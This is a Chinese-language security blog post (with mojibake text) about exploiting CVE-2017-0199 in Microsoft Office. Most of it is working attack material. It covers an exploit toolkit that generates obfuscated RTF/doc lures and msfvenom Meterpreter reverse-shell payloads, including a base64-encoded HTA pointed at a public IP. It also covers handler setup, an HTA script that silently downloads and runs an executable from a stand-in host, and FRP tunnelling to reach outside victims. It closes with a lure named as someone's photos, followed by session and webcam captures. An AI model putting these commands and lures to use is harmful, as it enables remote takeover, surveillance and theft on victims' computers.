<!DOCTYPE html>
<html lang="zh"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="å‰è¨€
å•Šæ¯•ä¸šé…’ä¼šå®Œå†™æ–‡ç« å¥½æ™•ï¼"><title>OFFICE OLE2LINK æ¼æ´ (CVE-2017-0199) åˆ©ç”¨&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="OFFICE OLE2LINK æ¼æ´ (CVE-2017-0199) åˆ©ç”¨" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/zh/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/zh/categories/">åˆ†ç±»</a><a class="nav item" href="/zh/tags/">æ ‡ç­¾</a><a class="nav item" href="/zh/about/">å…³äº</a><a class="nav item" href="/zh/links/">å‹é“¾</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
    <h1 class="article title">OFFICE OLE2LINK æ¼æ´ (CVE-2017-0199) åˆ©ç”¨</h1><p class="article date">2017-05-07<span class="langs"><span class="lang">
                    <a href="/en/posts/exploiting-cve-2017-0199/" title="English">
                        <span class="lang-icon">ğŸŒ</span>English</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="å‰è¨€">å‰è¨€</h2>
<p>å•Šæ¯•ä¸šé…’ä¼šå®Œå†™æ–‡ç« å¥½æ™•ï¼</p>
<p>FireEyeä¸Šä¸ªæœˆå…¬å¸ƒäº†ä¸€ä¸ªOFFICE 0dayï¼Œæ‰“å¼€Wordæ–‡æ¡£å°±å¯ä»¥é€šè¿‡HTAè„šæœ¬æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>å¯èƒ½åˆšå¼€å§‹çœ‹æœ‰ç‚¹ä¹±ï¼Œç®€å•çœ‹ä¸€ä¸‹æ”»å‡»åŸç†</p>
<blockquote>
<p>1.æ”»å‡»è€…å‘ç›®æ ‡ç”¨æˆ·å‘é€ä¸€ä¸ªåµŒå…¥äº†OLE2LINKå¯¹è±¡çš„Wordæ–‡æ¡£ã€‚
2.å½“ç”¨æˆ·æ‰“å¼€æ–‡æ¡£ä¹‹åï¼Œwinword.exeä¼šå‘è¿œç¨‹æœåŠ¡å™¨å‘é€ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œå¹¶è·å–ä¸€ä¸ªæ¶æ„HTA(HTML Application)æ–‡ä»¶ï¼Œé€šè¿‡ç½‘ç»œæ›´æ–°å¯¹è±¡æ—¶æ²¡æœ‰æ­£ç¡®å¤„ç†çš„Content-Typeå¯¼è‡´HTAæ‰§è¡Œã€‚
3.Winword.exeä¼šé€šè¿‡ä¸€ä¸ªCOMå¯¹è±¡æ¥æŸ¥è¯¢HTAæ–‡ä»¶å¤„ç†å™¨ï¼Œè€Œè¿™ä¸€è¡Œä¸ºå°†ä¼šä½¿å¾®è½¯HTAåº”ç”¨ï¼ˆmshta.exeï¼‰åŠ è½½å¹¶æ‰§è¡Œæ¶æ„HTAæ–‡ä»¶ã€‚</p>
</blockquote>
<h2 id="å¤ç°">å¤ç°</h2>
<p>å¤ç°çš„æ­¥éª¤ï¼Œç”¨VBScriptç¼–å†™HTAï¼ŒæŠŠHTAé“¾æ¥æ’å…¥wordæ–‡æ¡£ï¼Œåœ¨é¶æœºä¸Šæ‰“å¼€ã€‚
æˆ‘è§‰å¾—æˆ‘æ²¡å¿…è¦é‡å†™äº†ï¼Œè¿™ç¯‡æ–‡ç« å†™çš„éå¸¸è¯¦ç»†ã€‚
<a href="http://www.duorenwei.com/news/5257.html"target="_blank" rel="noopener noreferrer">OFFICE OLE2LINKï¼ˆCVE-2017-0199ï¼‰æ¼æ´åˆ©ç”¨è¯¦è§£</a></p>
<h2 id="exploit-toolkit-cve-2017-0199">Exploit toolkit CVE-2017-0199</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/bhdresh/CVE-2017-0199
</span></span></code></pre></div><p>æ¨èè¿™ä¸ªå·¥å…·ï¼Œä¸éœ€è¦æ­å»ºæœåŠ¡å™¨ï¼Œç›´æ¥ç”¨socketæ¨¡å—æ¨¡æ‹ŸæœåŠ¡å™¨ï¼Œéå¸¸æ–¹ä¾¿ã€‚
é»˜è®¤åªèƒ½è¿è¡Œexeçš„payloadï¼Œé¦–å…ˆç”Ÿæˆæ–‡æ¡£ï¼Œåç¼€åéšæ„ã€‚rtfä¹Ÿè¡Œï¼Œdocä¹Ÿè¡Œã€‚
å‚æ•°-u å°±æ˜¯æˆ‘ä»¬ç”¨çš„payloadåœ°å€ï¼Œæ®è¯´åç¼€åç”¨docæ˜¯ä¸ºäº†bypass avã€‚
åŠ  -x å‚æ•°å¯ä»¥å¯¹å†…å®¹è¿›è¡Œæ··æ·†ã€‚æ··æ·†çš„æ–¹å¼è¯·æŸ¥é˜…generate_exploit_obfuscate_rtfå‡½æ•°ï¼Œä¸»è¦å°±æ˜¯æŠŠpayloadsçš„uriæ··æ·†ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.92.1/logo.doc -x <span class="m">1</span>
</span></span></code></pre></div><h3 id="ç”Ÿæˆpayloads">ç”ŸæˆPayloads</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.92.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe &gt; /home/gorgias/Tools/malware/rtf32.exe
</span></span></code></pre></div><h3 id="ç­‰å¾…åå¼¹shell">ç­‰å¾…åå¼¹shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.92.1; run&#34;</span>
</span></span></code></pre></div><h3 id="ä¼ è¾“payloads">ä¼ è¾“Payloads</h3>
<p>è¿è¡Œè¿™æ®µä»£ç ï¼Œç«¯å£é»˜è®¤8080ï¼Œ -p æ‰‹åŠ¨è®¾å®šç«¯å£ï¼ŒåŠ  -H å¯ä»¥è¿è¡ŒæŒ‡å®šè„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python2 cve-2017-0199_toolkit.py -H test.hta -M exp -e http://192.168.92.1/shell.exe -l /home/gorgias/Tools/malware/rtf64.exe -p <span class="m">8000</span>
</span></span></code></pre></div><p>å®¢æˆ·ç«¯æ‰“å¼€ç›®æ ‡æ–‡æ¡£åï¼Œé»˜è®¤ä¼šè¿è¡Œè¿™æ®µè„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">a</span><span class="o">=</span>new ActiveXObject<span class="o">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">a.run<span class="o">(</span><span class="s1">&#39;%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\&#39;</span>http://yourpayloads.com/evil.exe<span class="se">\&#39;</span>, <span class="se">\&#39;</span>c:/windows/temp/shell.exe<span class="se">\&#39;</span><span class="o">)</span><span class="p">;</span> c:/windows/temp/shell.exe<span class="err">&#39;</span>, 0<span class="o">)</span><span class="p">;</span>window.close<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span></code></pre></div><h2 id="msf-module">MSF Module</h2>
<p>å¯ä»¥ä½¿ç”¨è¿™ä¸ªexploitæ¨¡å—:office_word_htaæ¥å®ç°æ”»å‡»ã€‚
ä½†æ˜¯ä½¿ç”¨åœºæ™¯æœ‰é™ï¼Œå› ä¸ºè¿™ä¸ªæ¨¡å—å¤ªè‡ªåŠ¨åŒ–äº†ï¼Œä»ç”Ÿæˆpayloadåˆ°ä½¿ç”¨handleréƒ½æ˜¯è‡ªåŠ¨é…ç½®ï¼Œpayloadçš„åå¼¹ipæ˜¯å›ºå®šçš„ï¼Œä¸èƒ½ç”¨å†…ç½‘ç©¿é€çš„åŠæ³•æ¸—é€å¤–ç½‘ä¸»æœºï¼Œéœ€è¦æ”¹é€ ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf &gt; use exploit/windows/fileformat/office_word_hta
</span></span></code></pre></div><p>æŸ¥çœ‹é€‰é¡¹ï¼Œæè¿°éƒ½å¾ˆå‡†ç¡®ï¼Œé€‰é¡¹å¾ˆå°‘ï¼Œé…ç½®ç®€å•ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt; options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/windows/fileformat/office_word_hta<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   FILENAME  msf.doc          yes       The file name.
</span></span><span class="line"><span class="cl">   SRVHOST   0.0.0.0          yes       The <span class="nb">local</span> host to listen on. This must be an address on the <span class="nb">local</span> machine or 0.0.0.0
</span></span><span class="line"><span class="cl">   SRVPORT   <span class="m">8080</span>             yes       The <span class="nb">local</span> port to listen on.
</span></span><span class="line"><span class="cl">   SSL       <span class="nb">false</span>            no        Negotiate SSL <span class="k">for</span> incoming connections
</span></span><span class="line"><span class="cl">   SSLCert                    no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
</span></span><span class="line"><span class="cl">   URIPATH   default.hta      yes       The URI to use <span class="k">for</span> the HTA file
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Microsoft Office Word
</span></span></code></pre></div><p>ç›´æ¥runæˆ–è€…exploitå°±å¥½ï¼Œä¼šè‡ªåŠ¨åˆ‡åˆ°åå°ï¼Œhtaå’Œdocéƒ½ç»™ä½ ç”Ÿæˆå¥½äº†ã€‚ç›´æ¥æŠŠdocæ”¾åœ¨é¶æœºæ‰“å¼€å°±è¡Œã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt; exploit
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.1.177:4444
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> msf.doc stored at /home/gorgias/.msf4/local/msf.doc
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using URL: http://0.0.0.0:8080/default.hta
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Local IP: http://192.168.1.177:8080/default.hta
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Server started.
</span></span></code></pre></div><h2 id="å®æˆ˜">å®æˆ˜</h2>
<p>è¿™é‡Œå±•ç¤ºå¦‚ä½•ç©¿é€å†…ç½‘æ¥å®ç°æ”»å‡»ï¼Œé¦–å…ˆæ‰¾ä¸€å°æœåŠ¡å™¨å®‰è£…frpï¼Œä»£ç†æœ¬åœ°payloadå’Œreverse_shellç«¯å£ã€‚
å®‰è£…æ–¹æ³•è§<a href="https://gorgias.me/2017/05/03/frp%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"target="_blank" rel="noopener noreferrer">FRP ä½¿ç”¨ç¬”è®°</a>
frpå‚æ•°</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>rev<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">privilege_mode</span> <span class="o">=</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">type</span> <span class="o">=</span> tcp
</span></span><span class="line"><span class="cl"><span class="nv">local_ip</span> <span class="o">=</span> 0.0.0.0
</span></span><span class="line"><span class="cl"><span class="nv">local_port</span> <span class="o">=</span> <span class="m">4445</span>
</span></span><span class="line"><span class="cl"><span class="nv">remote_port</span> <span class="o">=</span> <span class="m">4445</span>
</span></span></code></pre></div><p>ä½¿ç”¨msfvenomç”Ÿæˆhtaçš„payloadï¼Œæˆ‘ä»¬è¿™é‡Œç”¨powershellçš„ç±»å‹ï¼Œç”¨base64è¿›è¡Œæ··æ·†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>45.32.42.185 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4445</span> -e cmd/powershell_base64 -f hta-psh &gt; /home/gorgias/Tools/malware/frp.hta
</span></span></code></pre></div><p>ç­‰å¾…åå¼¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4445; run&#34;</span>
</span></span></code></pre></div><p>ç”Ÿæˆæ–‡æ¡£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 cve-2017-0199_toolkit.py -M gen -w ç‹å¸ˆå‚…çš„ç…§ç‰‡.doc -u http://frp.gorgiaxx.me:8000/photo.doc -x <span class="m">1</span>
</span></span></code></pre></div><p>ç”¨äº†è‡ªå®šä¹‰htaçš„è¯å°±ä¸ä¸€å®šè¦ä½¿ç”¨exeçš„payloadäº†ã€‚ç›´æ¥ç›‘å¬ç«¯å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python2 cve-2017-0199_toolkit.py -M exp -H frp.hta -p <span class="m">8080</span>
</span></span></code></pre></div><p><img loading="lazy"  src="./gen.png"
        alt="gen"/>
ç„¶åè®©ç”µè„‘è£…æœ‰ç›®æ ‡ç‰ˆæœ¬officeçš„å—å®³è€…æ‰“å¼€è¿™ä¸ªdoc
å°±èƒ½è·å–ä¼šè¯
<img loading="lazy"  src="./meterpreter.png"
        alt="meterpreter"/>
<img loading="lazy"  src="./screenshot.jpeg"
        alt="screenshot"/>
<img loading="lazy"  src="./cam_snap.jpeg"
        alt="cam_snap"/></p>
<h2 id="reference">Reference</h2>
<p><a href="http://www.91ri.org/16953.html"target="_blank" rel="noopener noreferrer">CVE-2017-0199æ¼æ´å¤ç°è¿‡ç¨‹</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/26522540"target="_blank" rel="noopener noreferrer">å¯¹CVE-2017-0199çš„ä¸€æ¬¡å¤ç°è¿‡ç¨‹ä¸å†…ç½‘ç©¿é€çš„åˆ©ç”¨</a></p>
<p><a href="http://www.4hou.com/technology/4260.html"target="_blank" rel="noopener noreferrer">CVE-2017-0199â€”â€”é¦–ä¸ªMicrosoft Office RTFæ¼æ´</a></p>
<p><a href="http://www.duorenwei.com/news/5257.html"target="_blank" rel="noopener noreferrer">OFFICE OLE2LINKï¼ˆCVE-2017-0199ï¼‰æ¼æ´åˆ©ç”¨è¯¦è§£</a></p>
<p><a href="http://securityaffairs.co/wordpress/58077/breaking-news/cve-2017-0199-exploitation-poc.html"target="_blank" rel="noopener noreferrer">Windows attacks via CVE-2017-0199 â€“ Practical exploitation! (PoC)</a></p>
</article><section class="article labels"><a class="category" href=/zh/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>ç½‘ç»œå®‰å…¨</a><a class="tag" href=/zh/tags/rtf/>RTF</a><a class="tag" href=/zh/tags/cve-2017-0199/>CVE-2017-0199</a></section>
</div>
<div class="article bottom"><section class="article navigation"><p><a class="link" href="/zh/posts/d-link-dir-850l-router-vulnerability-report/"><span class="iconfont icon-article"></span>D-Link DIR 850L è·¯ç”±å™¨æ¼æ´éªŒè¯æŠ¥å‘Š</a></p><p><a class="link" href="/zh/posts/frp-notes/"><span class="iconfont icon-article"></span>FRPä½¿ç”¨ç¬”è®°</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>